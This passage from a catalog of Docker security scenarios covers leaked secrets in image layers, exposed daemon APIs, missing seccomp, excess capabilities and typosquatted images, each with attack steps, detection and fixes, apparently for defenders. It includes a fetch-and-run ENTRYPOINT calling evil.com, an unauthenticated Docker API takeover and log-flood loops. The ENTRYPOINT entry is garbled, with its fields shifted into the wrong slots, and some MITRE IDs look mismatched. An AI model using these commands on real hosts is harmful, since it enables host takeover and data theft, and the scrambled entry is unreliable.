- **Attack Steps**: 1. Attacker downloads a public image from DockerHub or GitHub Container Registry.2. They run docker history to view layers and note that the image contains several suspiciously large layers.3. Using docker save and tar -xf, attacker extracts the layers and inspects contents.4. Finds .aws/credentials with active AWS access and secret keys used during image build.5. Uses AWS CLI to run aws sts get-caller-identity to validate access.6. Keys allow full s3:* or even ec2:*, resulting in potential infrastructure compromise.7. Developers often forget to remove such files or use .dockerignore.8. Always inject secrets at runtime using env vars or secret managers like Vault.9. Apply multi-stage builds and .dockerignore to avoid leaking local configs.10. Red Team uses this to demonstrate real-world credential leaks via image layers.
- **Detection**: Static layer inspection, Trivy scan
- **Solution**: Use .dockerignore, inject secrets at runtime only
- **Tags**: #awskeys #secretleak #dockerlayers

## Misconfigured Docker Compose File Grants Host Access

- **Attack Type**: Compose Misconfiguration
- **Target**: Docker Compose
- **Vulnerability**: Unsafe volume bind to host dir
- **MITRE**: T1087
- **Impact**: Secrets, config leakage into container
- **Tools**: Docker Compose, Bash
- **Scenario**: Compose file mounts host filesystem into container via . or / bind
- **Attack Steps**: 1. Developer writes a simple docker-compose.yml for testing:<br>services:<br>&nbsp;&nbsp;web:<br>&nbsp;&nbsp;&nbsp;&nbsp;image: nginx<br>&nbsp;&nbsp;&nbsp;&nbsp;volumes:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- .:/app<br>2. They run docker-compose up, unaware that their entire current directory (including .env, .git, secrets) is exposed.3. Attacker gains container access and traverses mounted volume to read sensitive files.4. In shared environments, this exposes build context, keys, or credentials.5. Blue Team sees no anomaly as containers are technically behaving normally.6. Educate developers to explicitly define safe volumes and use read-only flags when possible.7. Validate Compose configs with linters like docker-compose-linter.8. Avoid lazy use of .:/app in production workflows.9. CI pipelines should test for broad volume patterns.10. Add guardrails like pre-commit hooks or config scanning tools.
- **Detection**: Manual inspection, config scan
- **Solution**: Avoid . mounts; use Docker secrets
- **Tags**: #compose #volumeleak #bindmount

## Denial of Service via Image with Infinite Loop Entrypoint

- **Attack Type**: Entrypoint DoS
- **Target**: Docker Daemon
- **Vulnerability**: Unlimited logs + looping entrypoint
- **MITRE**: T1499.002
- **Impact**: DoS via disk exhaustion from logs
- **Tools**: Bash, Dockerfile
- **Scenario**: Entrypoint script launches infinite loop, consuming CPU and logs
- **Attack Steps**: 1. Attacker creates a malicious image with this Dockerfile:<br>FROM alpine<br>CMD while true; do echo "hello"; done<br>2. When deployed, this floods STDOUT and logging systems, quickly exhausting disk space.3. The container runs without any logging limit (max-size, max-file) in the daemon config.4. Logs fill up /var/lib/docker/containers/.../log.json, causing host storage exhaustion.5. Syslog and monitoring tools become unresponsive.6. Defender investigation delayed as logging itself is impaired.7. Daemon should enforce logging limits via --log-opt max-size=10m --log-opt max-file=3.8. Avoid deploying unaudited containers; run pre-deploy static checks.9. Use log rotation and alert on disk usage spikes.10. Red Team uses this to simulate unintentional or malicious log spamming.
- **Detection**: Disk usage monitor, log file watcher
- **Solution**: Use logging limits and entrypoint validation
- **Tags**: #logdos #entrypointloop #containerlog

## Using :latest Tag Leads to Unexpected Vulnerabilities

- **Attack Type**: Image Versioning Risk
- **Target**: Dockerfile Builds
- **Vulnerability**: Use of :latest without pinning
- **MITRE**: T1601
- **Impact**: Build failure or backdoor introduction
- **Tools**: Docker CLI, Dockerfile
- **Scenario**: Dockerfile pulls :latest tag which breaks builds or introduces old vulns
- **Attack Steps**: 1. Developer writes FROM node:latest in Dockerfile for convenience.2. Builds succeed today, but two weeks later, the same build pulls a newer Node.js version with known vulnerabilities.3. Regression bugs or removed modules break downstream apps.4. Devs spend hours debugging build failures due to invisible version drift.5. Vulnerability scanners now flag this image, increasing audit burden.6. Always pin image versions (node:18.13.0-alpine) to ensure reproducibility.7. Use Renovate or Dependabot to track base image updates.8. Red Team exploits this drift by republishing public image with backdoor.9. Blue Team should ban unpinned base images via policy-as-code.10. CI should fail builds that use :latest tag.
- **Detection**: Build diffing, image digest alerts
- **Solution**: Pin image versions strictly
- **Tags**: #latesttag #dockerfile #versiondrift

## Sensitive Tokens Found via History Reuse in Docker Layers

- **Attack Type**: Layer Caching Issue
- **Target**: Docker Image
- **Vulnerability**: Secret in earlier layers due to cache
- **MITRE**: T1552
- **Impact**: Token compromise even after deletion
- **Tools**: Docker CLI, Trivy
- **Scenario**: Docker layer caching exposes previously removed tokens via docker history
- **Attack Steps**: 1. During build, developer adds ENV AWS_SECRET=abc123 and later deletes it with RUN rm ~/.aws/credentials.2. Although the file is deleted in a later layer, it remains in the earlier layers.3. Running docker history shows size anomalies; docker save allows extracting the deleted layer.4. Attacker retrieves secret via tar and reuses valid token.5. This is common in teams unaware of how Docker layering works.6. Solution: use multi-stage builds, do not use ENV for secrets.7. Runtime injection via Vault or GitHub Actions secrets is better.8. Regular image scanning via Trivy or Dockle flags such layers.9. Awareness of build caching is key for all DevOps teams.10. Red Team uses this for credential harvest demo in bug bounty programs.
- **Detection**: Image scanning, manual tar inspect
- **Solution**: Use multi-stage builds; never bake secrets
- **Tags**: #dockerlayers #secretinimage #envleak

## Private Keys Left in Docker Images Used in CI

- **Attack Type**: Secrets Exposure - CI/CD
- **Target**: Internal CI Registry
- **Vulnerability**: SSH keys in image context
- **MITRE**: T1552.004
- **Impact**: Server compromise via build key reuse
- **Tools**: Dockerfile, Trivy
- **Scenario**: Developer copies SSH keys during build for deploy, forgets to remove
- **Attack Steps**: 1. Dev writes Dockerfile that includes: COPY id_rsa /root/.ssh/id_rsa for internal deployment.2. Forgets to remove key in later layer or uses one-stage build.3. Builds image and pushes it to internal registry.4. Attacker scans registry or gets access via leaked URL.5. Extracts image, finds SSH key, and uses it to pivot into deployment server.6. Blue Team had no image signing or scanning in place.7. Enforce use of .dockerignore, multi-stage builds, and image scanners.8. Keep keys out of build context altogether.9. Git pre-commit hooks can warn about private keys in projects.10. Red Teams demonstrate this via GitHub-to-registry-to-host compromise chain.
- **Detection**: Image scanning, CI config audit
- **Solution**: Never copy keys into images; use deploy agents
- **Tags**: #sshkeyleak #ciimage #dockerignore

## Unverified Base Images Allow Code Injection from Registry

- **Attack Type**: Image Spoofing
- **Target**: Internal Registry
- **Vulnerability**: Registry lacks integrity checks
- **MITRE**: T1195.002
- **Impact**: Code execution from base image manipulation
- **Tools**: Docker CLI, Cosign
- **Scenario**: Base image replaced in registry by attacker with same name, different digest
- **Attack Steps**: 1. Developer writes FROM myregistry/mybase:1.0 in Dockerfile.2. Registry is internal but poorly secured; attacker replaces mybase:1.0 with malicious version.3. New image looks the same, but digest has changed.4. Build proceeds, and attacker’s code (e.g., reverse shell) is included.5. No signature verification or image digest validation is enforced.6. Blue Team only notices when production servers behave erratically.7. Always verify image signatures using Cosign, Docker Content Trust, or Notary.8. Enforce immutable tags or use digests (@sha256) in Dockerfile.9. Registry access should be logged and role-restricted.10. Red Team exploits this to simulate insider supply-chain compromise.
- **Detection**: Signature mismatch, digest diff alert
- **Solution**: Use Cosign or DCT to verify base image
- **Tags**: #registryspoof #cosign #dockertrust

## Unrestricted Syscalls Due to Missing Seccomp Profile

- **Attack Type**: Seccomp Misconfiguration
- **Target**: Containerized Hosts
- **Vulnerability**: Containers lack syscall filtering
- **MITRE**: T1609
- **Impact**: Potential kernel abuse, host compromise
- **Tools**: Docker CLI, Sysdig, strace
- **Scenario**: Launch container without seccomp profile, enabling syscalls like ptrace, mknod
- **Attack Steps**: 1. Attacker starts a Docker container using the --security-opt seccomp=unconfined flag or host defaults are set without any profile.2. Inside the container, attacker uses ptrace to observe other processes, mknod to create device nodes, or custom syscalls to attempt kernel interaction.3. These syscalls are typically blocked by seccomp but go unnoticed in this misconfigured setup.4. If the container is privileged or has access to /proc, it can read host details or escalate further.5. Blue Team does not detect the behavior due to lack of syscall logging or auditd configuration.6. Use sysdig or strace to detect abnormal syscall usage patterns.7. Apply default or custom seccomp profiles that block dangerous syscalls.8. Enforce seccomp use at orchestrator level (e.g., Kubernetes PodSecurityPolicy).9. Scan running containers for dangerous capabilities using docker inspect.10. Red Team demonstrates potential kernel manipulation paths.
- **Detection**: Auditd, syscall trace, Sysdig
- **Solution**: Always apply strict seccomp profiles
- **Tags**: #seccomp #syscallabuse #dockerconfig

## High Privilege Capabilities Left Enabled in Container

- **Attack Type**: Linux Capabilities Misuse
- **Target**: Docker Hosts
- **Vulnerability**: Excessive Linux capabilities
- **MITRE**: T1548.004
- **Impact**: Unauthorized access, lateral movement
- **Tools**: Capsh, Docker CLI, LinPEAS
- **Scenario**: Docker container runs with extra Linux capabilities like SYS_ADMIN, NET_ADMIN
- **Attack Steps**: 1. Developer launches a container without disabling default Linux capabilities.2. Container retains elevated permissions like CAP_SYS_ADMIN, CAP_NET_RAW, CAP_SYS_PTRACE, etc.3. Attacker inside container uses capsh --print to enumerate capabilities.4. With CAP_SYS_ADMIN, attacker mounts devices, bypasses namespaces, or loads kernel modules.5. CAP_NET_RAW enables raw socket creation for sniffing traffic.6. Blue Team misses this as capability inspection is not part of CI/CD or runtime monitoring.7. Use docker run --cap-drop=ALL --cap-add=... to whitelist required permissions only.8. Tools like Dockle or Popeye can scan Dockerfiles or images for excessive permissions.9. Enforce security profiles with AppArmor and Seccomp to further harden behavior.10. Regular reviews of docker inspect outputs should be automated.
- **Detection**: Capability inspection tools, container scanning
- **Solution**: Drop all unnecessary capabilities
- **Tags**: #linuxcapabilities #sysadmin #dockerhardening

## DoS via Unbounded Logging in Misconfigured Containers

- **Attack Type**: Log Exhaustion - DoS
- **Target**: Docker Daemon Host
- **Vulnerability**: No logging limits set
- **MITRE**: T1499.002
- **Impact**: Log-based disk exhaustion, DoS
- **Tools**: Docker CLI, Logrotate, Filebeat
- **Scenario**: Container logs spammed due to verbose process; host storage fills up
- **Attack Steps**: 1. Attacker creates a Docker container with an entrypoint that outputs logs continuously: while true; do echo "logspam"; done.2. The Docker daemon's log driver (json-file) is configured with no rotation limits.3. Container runs in background for hours, writing logs to /var/lib/docker/containers/.../log.json.4. Host disk usage spikes, leading to failure of other services and system instability.5. Blue Team may notice this late unless disk monitoring is enforced.6. Logs may be shipped externally, compounding the effect on remote log ingestion tools.7. Implement --log-opt max-size=10m --log-opt max-file=3 to limit log growth.8. Use external log shippers like Filebeat with rate controls.9. Alert on log file size anomalies and disk thresholds.10. Red Teams simulate this attack in shared CI/CD test runners.
- **Detection**: Disk monitoring tools, log size audits
- **Solution**: Apply log rotation settings in Docker daemon
- **Tags**: #logspam #dockerlogging #dosattack

## Public Dockerfile Exposure in GitHub Leaks Build Context

- **Attack Type**: Dockerfile Info Disclosure
- **Target**: Public GitHub Repos
- **Vulnerability**: Dockerfile contains hardcoded info
- **MITRE**: T1552.001
- **Impact**: Secret exfiltration, recon
- **Tools**: GitHub, GitLeaks, TruffleHog
- **Scenario**: Publicly committed Dockerfile reveals secrets or internal architecture
- **Attack Steps**: 1. Developer pushes a Dockerfile to a public GitHub repo for open-source sharing.2. The Dockerfile contains internal URLs, API endpoints, version numbers, or worse—hardcoded secrets (ENV API_KEY=...).3. Red Team uses GitHub dorks (filename:Dockerfile) to discover exposed build contexts.4. Secrets harvesting tools like TruffleHog or GitLeaks extract leaked credentials.5. These can be used to access internal systems or production APIs.6. Blue Team fails to detect this leak unless DLP or secret scanning tools are integrated.7. Avoid committing any Dockerfiles with sensitive values directly.8. Use .dockerignore and inject secrets at runtime only.9. Enable GitHub’s secret scanning and security alerts.10. Revoke any leaked tokens immediately and rotate secrets.
- **Detection**: GitHub scanners, GitHub Advanced Security
- **Solution**: Use secret scanning tools and avoid hardcoding
- **Tags**: #githubleak #dockerfile #apikeys

## Hardcoded Database Passwords in Base Images

- **Attack Type**: Secrets in Base Image
- **Target**: CI/CD Pipelines
- **Vulnerability**: Secrets embedded via ENV/COPY
- **MITRE**: T1552.004
- **Impact**: Database compromise via leaked password
- **Tools**: Trivy, Dive, Bash
- **Scenario**: Image layers contain MySQL or MongoDB passwords from ENV or file copy
- **Attack Steps**: 1. Developer creates base image for CI pipeline and sets credentials using ENV MYSQL_PASSWORD=root123.2. Alternatively, copies a config.js or .env file directly via COPY during image build.3. These secrets are stored in image layers, which persist even if deleted later in a later RUN step.4. Red Team pulls image and uses docker save, extracts layers, and inspects /etc or /app files.5. Finds production database credentials reused across environments.6. Blue Team unaware because secrets are not visible in container runtime.7. Use multi-stage builds and .dockerignore to eliminate secret retention.8. Use tools like Trivy or Dive to detect secrets in image layers.9. Rotate any potentially compromised credentials immediately.10. Integrate secret management via Vault or AWS Secrets Manager.
- **Detection**: Trivy scan, GitHub secret detection
- **Solution**: Never embed secrets in builds; rotate on leak
- **Tags**: #dockerbuild #envsecrets #dbpassword

## Using Outdated Base Images with Known CVEs

- **Attack Type**: CVE Exploitation in Image
- **Target**: Docker Builds
- **Vulnerability**: Use of vulnerable base images
- **MITRE**: T1190
- **Impact**: Remote code execution or privilege escalation
- **Tools**: Docker CLI, Trivy, Snyk
- **Scenario**: Developers build apps on ubuntu:16.04 or alpine:3.9 with public exploits
- **Attack Steps**: 1. Dockerfile uses a pinned but outdated base image like ubuntu:16.04 or node:10.2. These contain packages with known CVEs (e.g., OpenSSL, Bash, glibc).3. Attacker pulls image and tests known exploits using Metasploit or PoCs from Exploit-DB.4. CI/CD pipelines don’t scan base images; vulnerable apps go into production.5. Blue Team only notices after post-exploitation.6. Red Team uses this to demonstrate poor image hygiene.7. Integrate Snyk or Trivy in CI to scan all base images.8. Use automated image update tools like Renovate to track CVEs.9. Apply runtime detection to flag vulnerable binaries in containers.10. Never use EOL images or unmaintained Docker tags.
- **Detection**: CVE scan, vulnerability dashboard
- **Solution**: Auto-scan images and enforce freshness
- **Tags**: #dockerbase #cvescan #eolimages

## CI Pipeline Pulls Malicious Image by Digest Collision

- **Attack Type**: Digest Collision Attack
- **Target**: Docker Registry
- **Vulnerability**: Tag mutability, digest hijack
- **MITRE**: T1195.002
- **Impact**: Code execution via image replacement
- **Tools**: Docker Registry, GitHub Actions
- **Scenario**: Registry image overwritten with same tag but new digest after caching
- **Attack Steps**: 1. Developer pins image as myregistry/myapp:stable, but doesn’t lock digest (@sha256 form).2. Attacker gains access to registry and uploads new malicious image under the same tag.3. CI pipeline fetches image using tag, unaware of change.4. Malicious image executes extra scripts (e.g., reverse shells, data exfil).5. Blue Team doesn’t notice because tag remains unchanged.6. Avoid using mutable tags; always pin by digest (@sha256:...).7. Use Cosign or Docker Content Trust to verify signatures.8. Registry should enforce access controls and immutability.9. Monitor digest mismatches between builds.10. Red Team demonstrates this by comparing old vs new digests during CI build.
- **Detection**: Digest mismatch, supply chain scan
- **Solution**: Pin images with digest, verify signatures
- **Tags**: #imagepinning #digestattack #ciabuse

## Attack via ENTRYPOINT Exploit in Public Image

- **Attack Type**: Entrypoint Trojan
- **Target**: bash"].<br>2. Developer pulls image and uses it in Dockerfile or Compose without overriding the ENTRYPOINT.<br>3. On container start, malicious code is executed.<br>4. Blue Team doesn’t detect anything due to normal image appearance.<br>5. ENTRYPOINTs are often overlooked during reviews.<br>6. Always inspect ENTRYPOINT and CMD of public images.<br>7. Override unknown commands explicitly in Compose or Dockerfile.<br>8. Use image inspection tools (docker inspect`, Trivy).9. Maintain image allowlists and scan third-party images.10. Educate teams about ENTRYPOINT abuse risks.
- **Vulnerability**: Public Docker Images
- **MITRE**: Malicious default ENTRYPOINT
- **Impact**: T1203
- **Tools**: Dockerfile, Entrypoint, Bash
- **Scenario**: Public Docker image includes malicious ENTRYPOINT not overridden by user
- **Attack Steps**: 1. Attacker publishes a public Docker image with a seemingly harmless base like node, but with ENTRYPOINT `["/bin/bash", "-c", "curl evil.com/script.sh
- **Detection**: Remote code execution at container start
- **Solution**: Image inspection, command diff
- **Tags**: Always inspect and override ENTRYPOINTs

## Excessive File Permissions on Secrets in Container

- **Attack Type**: Permission Misconfig
- **Target**: Container Filesystem
- **Vulnerability**: Over-permissive secret files
- **MITRE**: T1145
- **Impact**: Lateral movement from secret exposure
- **Tools**: Bash, ls -l, Dockerfile
- **Scenario**: Secrets are stored in /app/.env with 777 permissions inside container
- **Attack Steps**: 1. Developer includes a .env file in image containing sensitive values (API keys, DB creds).2. During build or startup, file is copied with chmod 777 permissions.3. Any process/user in the container can read/write the file.4. If attacker gains code execution, they can dump all secrets instantly.5. Blue Team has no runtime visibility into file-level permissions.6. Use best practice file permissions (chmod 600, owner-only access).7. Use secret mounts via volumes or Docker secrets, not file copies.8. Run processes as non-root wherever possible.9. Scan containers for world-readable secret files.10. Educate teams on least privilege in filesystem design.
- **Detection**: File inspection, mount analysis
- **Solution**: Enforce minimal access for secret files
- **Tags**: #chmod #envleak #dockerfilesystem

## Git Credentials Stored in Docker Image Layers

- **Attack Type**: Secret Retention via .git-credentials
- **Target**: Git-backed Docker Builds
- **Vulnerability**: Git token files included in image
- **MITRE**: T1552.001
- **Impact**: Private repo access, source leak
- **Tools**: Git, Docker CLI, Trivy
- **Scenario**: Git helper leaves tokens in image, accessible post-build
- **Attack Steps**: 1. Developer builds container while authenticated to Git using git-credential-store.2. File .git-credentials is cached and copied during build.3. Image is pushed to public/private registry.4. Attacker pulls image, extracts file, and uses stored token to access private repos.5. Trivy scan reveals .git-credentials with plaintext tokens.6. Use ephemeral credentials or token-based Git authentication.7. Do not cache credential stores in builds.8. Use .dockerignore and inspect build contexts carefully.9. Revoke any detected tokens immediately and rotate credentials.10. CI should block builds that include known credential filenames.
- **Detection**: Static scan, Trivy, image diff tools
- **Solution**: Avoid including credential helpers in build
- **Tags**: #gitcreds #dockerlayer #buildleak

## Docker Daemon Exposed Without TLS

- **Attack Type**: Remote Docker API Exposure
- **Target**: Docker Host
- **Vulnerability**: Remote API exposed without auth
- **MITRE**: T1525
- **Impact**: Remote host takeover
- **Tools**: nmap, curl, docker CLI, Shodan
- **Scenario**: Exposed Docker API allows attacker to control host remotely
- **Attack Steps**: 1. An organization configures a Docker host with the remote API (dockerd -H tcp://0.0.0.0:2375) for CI access but forgets to enable TLS authentication.2. Attacker uses Shodan or nmap to scan the internet for open Docker APIs on port 2375.3. Once discovered, attacker sends unauthenticated HTTP requests to list containers (curl http://<ip>:2375/containers/json).4. Attacker spins up a new container with a mounted / from the host (/host) and gains full root access.5. This results in complete host compromise, as Docker has root access on Linux.6. Blue Team lacks alerts on port scans or API abuse.7. Harden Docker hosts: never expose 2375 externally; if needed, require TLS with client certs.8. Use host-based firewall (ufw, iptables) to restrict access.9. Continuously scan internet-facing assets with nmap, Shodan, or security tools.10. Monitor for abnormal container launches via audit logs.
- **Detection**: Port scans, container inventory diff
- **Solution**: Close port 2375 or enable TLS + mTLS
- **Tags**: #dockerapi #remotetakeover #port2375

## Default Docker Bridge Network Enables ARP Spoofing

- **Attack Type**: Lateral Movement via Bridge
- **Target**: Container-to-Container Network
- **Vulnerability**: Shared bridge allows spoofing
- **MITRE**: T1040
- **Impact**: MitM within container clusters
- **Tools**: arpspoof, tcpdump, ettercap
- **Scenario**: Containers share default docker0 bridge, enabling ARP poisoning attacks
- **Attack Steps**: 1. Multiple containers run on the default Docker bridge network (docker0).2. Attacker container runs ARP spoofing tool like arpspoof or ettercap to poison the ARP table.3. Victim containers start routing traffic through attacker.4. Attacker performs Man-in-the-Middle (MitM) attack, sniffing credentials, API keys, or traffic.5. No network segmentation or IDS is in place to flag container-to-container interference.6. Blue Team lacks visibility into internal container networks.7. Use custom bridge networks with user-defined IPAM and subnet isolation.8. Use service mesh (e.g., Istio) or container firewalls (Cilium) to restrict communication.9. Monitor ARP anomalies inside container networks.10. Apply eBPF-based network policies for least privilege.
- **Detection**: Packet sniffers, ARP log monitoring
- **Solution**: Use isolated networks and container firewalls
- **Tags**: #dockernetwork #arpspoof #bridgeattack

## Orphaned Docker Volumes Contain Sensitive Data

- **Attack Type**: Persistent Volume Data Leak
- **Target**: Docker Host Volumes
- **Vulnerability**: Residual sensitive files in volumes
- **MITRE**: T1552
- **Impact**: Post-deletion data exfiltration
- **Tools**: docker volume, find, grep
- **Scenario**: Old volumes store logs, credentials, or tokens long after containers are deleted
- **Attack Steps**: 1. Developer creates a container with named volume (-v myvol:/data) for logs and configs.2. Over time, container is removed, but volume remains (docker volume ls).3. Attacker with host access lists volumes and mounts them via a new container.4. Inside, attacker finds tokens in .aws, .npmrc, or log files.5. These secrets provide access to CI systems or cloud accounts.6. Blue Team rarely monitors unused volumes or enforces cleanup.7. Regularly audit docker volume ls and docker volume inspect for sensitive paths.8. Use docker volume prune to delete unused volumes securely.9. Integrate volume lifecycle checks in CI/CD cleanup steps.10. Use encryption at rest for volume mounts if sensitive data is involved.
- **Detection**: Volume inspection, host scans
- **Solution**: Prune old volumes; don’t store secrets unencrypted
- **Tags**: #dockervolume #dataretention #tokenleak

## Using Unverified Community Images from DockerHub

- **Attack Type**: Untrusted Image Pull
- **Target**: CI/CD Builds, Dev Workstations
- **Vulnerability**: Pulling from untrusted sources
- **MITRE**: T1195.002
- **Impact**: Remote code execution via poisoned images
- **Tools**: docker pull, dockle, Trivy, grep
- **Scenario**: Pulling malicious images with typosquatted or unofficial names
- **Attack Steps**: 1. Developer pulls nodejs:latest or ubunut:20.04 (note typo) instead of verified node:latest or ubuntu:20.04.2. Typosquatted images include malicious entrypoints, reverse shells, or crypto miners.3. These images are published by attackers on DockerHub and look similar to official ones.4. Once run, attacker-controlled scripts fetch C2 instructions.5. Blue Team has no registry policy to block unverified images.6. Use DockerHub's official image list or image signing with Cosign.7. Set CI policies to allow only signed or allowlisted images.8. Scan for hidden layers or extra processes using dockle, Trivy, or docker history.9. Monitor network behavior of pulled images in sandbox.10. Always cross-check image authorship before use.
- **Detection**: Container logs, image signature check
- **Solution**: Enforce registry policies and image signing
- **Tags**: #dockerhub #imagehijack #typosquat

## No Rate Limiting on Docker Registries

- **Attack Type**: DoS via Registry Abuse
- **Target**: Docker Registry
- **Vulnerability**: Unthrottled image upload/download
- **MITRE**: T1499.001
- **Impact**: Denial of Service on CI pipelines
- **Tools**: docker, Bash script
- **Scenario**: Attackers overwhelm internal registry with repeated pull/push operations
- **Attack Steps**: 1. Organization hosts internal Docker registry with no auth or rate limits (e.g., Harbor, Nexus).2. Attacker floods the registry using a script that uploads/pulls hundreds of images repeatedly.3. Registry consumes CPU, disk, and memory; CI/CD pipelines begin to fail.4. Logging pipeline is overwhelmed with push/pull logs.5. Blue Team may not realize root cause due to lack of registry metrics.6. Always apply rate-limiting (per IP/user/token) in Docker registry config.7. Require authentication and audit access to registry.8. Use monitoring tools like Prometheus to detect traffic spikes.9. Isolate registry traffic from internet using firewall or API gateway.10. Red Teams simulate this with flood scripts targeting the /v2/_catalog API.
- **Detection**: Registry metrics, CI error logs
- **Solution**: Apply rate limits and user auth on registry
- **Tags**: #registrydos #harbor #cioutage

## Reused SSH Keys Found in Docker Images

- **Attack Type**: Credential Reuse in Image
- **Target**: Docker Images
- **Vulnerability**: Credential reuse across environments
- **MITRE**: T1552.001
- **Impact**: Lateral movement via reused credentials
- **Tools**: grep, ssh-keygen, Trivy
- **Scenario**: Same SSH private key copied into multiple images, reused across infra
- **Attack Steps**: 1. Developer embeds a known SSH keypair into the container (for remote access or automation).2. Multiple containers across prod and staging are built from the same base image.3. Red Team gains access to one instance and extracts the private key from /root/.ssh/id_rsa.4. Key is used to pivot to other hosts or environments.5. Blue Team has no SSH key inventory or image audit.6. Never hardcode SSH keys into images or bake them into layers.7. Rotate keys frequently and restrict access using authorized_keys files.8. Use ephemeral keys generated per container instance.9. Audit SSH usage and restrict outbound access from containers.10. Scan image layers for .ssh folders and private key patterns.
- **Detection**: Image scan, key inventory
- **Solution**: Ban private key inclusion in builds
- **Tags**: #sshkeyleak #dockerimage #sshreuse

## Absence of User Namespace Mapping

- **Attack Type**: UID 0 Remapping Disabled
- **Target**: Docker Host
- **Vulnerability**: No user namespace separation
- **MITRE**: T1548.001
- **Impact**: Root escalation risk via container
- **Tools**: Docker CLI, /etc/subuid
- **Scenario**: Container root maps to host root due to lack of user namespace remapping
- **Attack Steps**: 1. Docker runs containers without --userns-remap, so UID 0 inside container maps to UID 0 on host.2. If attacker escapes container, they are instantly host root.3. Even without full escape, file permission issues arise with mounted volumes.4. Blue Team lacks visibility into UID mapping configurations.5. Use dockerd --userns-remap=default to ensure root maps to non-root on host (e.g., UID 100000).6. Verify mappings in /etc/subuid and /etc/subgid.7. Test remapping using sample containers and check with ls -n.8. Apply to all Docker hosts via daemon.json for consistency.9. This significantly reduces privilege escalation potential.10. Add this as a compliance check in CI/CD infra scans.
- **Detection**: UID inspection, Docker config audit
- **Solution**: Always enable user namespace remapping
- **Tags**: #userns #uid0 #rootmap

## .dockerignore Misconfigured to Expose Secrets

- **Attack Type**: Build Context Leakage
- **Target**: Docker Build Context
- **Vulnerability**: Build copies unintended secret files
- **MITRE**: T1552.004
- **Impact**: API keys, credentials leaked in images
- **Tools**: Git, Docker, Trivy
- **Scenario**: Files like .env, .pem, .git copied into build due to ignore mistake
- **Attack Steps**: 1. Developer forgets to exclude sensitive files in .dockerignore.2. During docker build, entire working directory including .aws, .git, and .env gets included in build context.3. These files are either copied or cached into image layers.4. Attacker extracts the image and retrieves secrets from these files.5. Blue Team has no visibility into build-time context leaks.6. Always maintain strict .dockerignore files.7. Use build automation (e.g., GitHub Actions) to verify .dockerignore presence.8. Scan images before publish with tools like Trivy to catch leaked files.9. Add pre-commit hooks that alert on sensitive file presence.10. Treat build context as sensitive and minimize source folder.
- **Detection**: Image scan, diff tool
- **Solution**: Harden and test .dockerignore
- **Tags**: #dockerignore #buildleak #contextabuse

## Containers Run as Root by Default

- **Attack Type**: Container Privilege Misuse
- **Target**: Container Runtime
- **Vulnerability**: Container runs as root by default
- **MITRE**: T1068
- **Impact**: Privilege escalation, host attack vector
- **Tools**: docker inspect, id, whoami
- **Scenario**: Docker containers default to UID 0 unless overridden
- **Attack Steps**: 1. Developer does not set USER in Dockerfile; container runs as root.2. Attacker gains code execution inside the container and already has root privileges.3. Even in isolated containers, attacker uses root to access mounted volumes, escalate through kernel flaws.4. Blue Team lacks policies enforcing non-root users.5. Always specify non-root USER directive in Dockerfile.6. Use tools like dockle, Trivy to check for root defaults.7. Orchestrators like Kubernetes should enforce PSPs restricting root.8. Add runtime checks to fail builds that contain USER root.9. Make root execution opt-in, not default.10. Educate developers via secure base images that default to non-root.
- **Detection**: Container image scan, PSPs
- **Solution**: Enforce non-root container users
- **Tags**: #dockerroot #userenforcement #privabuse

## Layers Reveal Deleted Secrets from Earlier Build Steps

- **Attack Type**: Layer Retention Misuse
- **Target**: Docker Images
- **Vulnerability**: Misunderstanding of image layers
- **MITRE**: T1565
- **Impact**: Secrets recovery from image layers
- **Tools**: docker history, Dive, Trivy
- **Scenario**: Secrets added then deleted still remain in image layers
- **Attack Steps**: 1. Developer adds a secret in RUN step: echo "KEY=secret" > config.2. Later, deletes it with rm config, thinking it is removed.3. Due to Docker's layer caching, the deleted file remains in a previous layer.4. Red Team uses docker history and Dive to explore image and recover deleted files.5. Blue Team does not check for secrets in historical layers.6. Use multi-stage builds to prevent layer pollution.7. Ensure secrets are injected at runtime, never at build time.8. Add image scanning in CI/CD for each layer.9. Use .dockerignore and avoid copying whole folders unless required.10. Enforce build policies to ban secrets during build.
- **Detection**: Layer inspection, image diff
- **Solution**: Clean builds, use runtime secrets
- **Tags**: #dockerlayers #buildsecrets #imagehistory

## Host Kernel Exposure via Container /proc/kallsyms

- **Attack Type**: Kernel Info Leak
- **Target**: Container Runtime
- **Vulnerability**: Kernel information exposed
- **MITRE**: T1068
- **Impact**: Kernel mapping for host attack
- **Tools**: Docker, cat, grep, uname
- **Scenario**: Containers reading /proc/kallsyms to map host kernel symbols for exploit
- **Attack Steps**: 1. A container is run without strict seccomp or AppArmor profiles, allowing access to host-like /proc filesystems.2. Red Team launches a container with default settings and checks /proc/kallsyms to view kernel symbol mappings (cat /proc/kallsyms).3. These symbols help map kernel addresses needed for kernel exploits (e.g., kernel privilege escalation via dirty pipe or similar).4. Without KASLR hardening and namespace restrictions, attacker can find target offsets.5. Blue Team is unaware as /proc/kallsyms isn't considered sensitive in some host configurations.6. Apply seccomp/AppArmor to deny access to sensitive filesystems from containers.7. Disable unneeded capabilities like SYS_PTRACE.8. Set up runtime policies to disallow mount and proc reads in non-debug containers.9. Scan for containers with abnormal read access using Falco.10. Patch and harden kernel, disable kallsyms export in prod systems.
- **Detection**: Falco rules for /proc reads
- **Solution**: Harden kernel & restrict proc access
- **Tags**: #kernelinfo #kallsyms #containerescape

## Docker Container with All Capabilities Enabled

- **Attack Type**: Capabilities Over-Provision
- **Target**: Docker Runtime
- **Vulnerability**: Full capabilities allowed
- **MITRE**: T1068
- **Impact**: Elevated privilege in container
- **Tools**: capsh, getcap, Docker
- **Scenario**: Lack of dropped capabilities allows full host interaction
- **Attack Steps**: 1. By default, Docker provides containers with a broad set of Linux capabilities.2. Red Team spins up a container and runs capsh --print to check which capabilities are enabled.3. With capabilities like SYS_MODULE, SYS_PTRACE, NET_ADMIN, the attacker can load kernel modules, sniff traffic, or perform process injection.4. The container is used to insert a kernel module or modify network interfaces.5. Blue Team has no runtime enforcement or alerting for unusual capabilities.6. Use Docker’s --cap-drop=ALL --cap-add=... to enforce least privilege.7. Implement Kubernetes PSPs or OPA/Gatekeeper to disallow unsafe capabilities.8. Audit all containers with tools like dockle, kubescape, or trivy.9. Use runtime detection (Falco, Cilium) to watch for capability abuse.10. Shift capability checks left during Dockerfile review.
- **Detection**: capsh, runtime scanners
- **Solution**: Drop all capabilities unless required
- **Tags**: #capabilities #dockerprivilege

## World-Readable Secrets in Image Layers

- **Attack Type**: Insecure File Permissions
- **Target**: Docker Images
- **Vulnerability**: Weak file permissions
- **MITRE**: T1552.004
- **Impact**: Credential leakage to attackers
